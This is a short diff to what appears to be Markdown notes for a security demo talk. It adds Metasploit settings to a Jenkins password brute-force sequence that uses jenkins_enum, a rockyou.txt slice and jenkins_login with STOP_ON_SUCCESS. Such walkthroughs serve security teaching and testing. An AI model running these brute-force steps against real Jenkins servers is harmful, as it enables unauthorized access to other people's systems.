@@ -28,6 +28,8 @@ use auxiliary/scanner/http/jenkins_enum
 sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
 [...]
 use auxiliary/scanner/http/jenkins_login
+set LOGIN_URL j_spring_security_check
+set STOP_ON_SUCCESS true
 ```
 
 ### Cloud Access
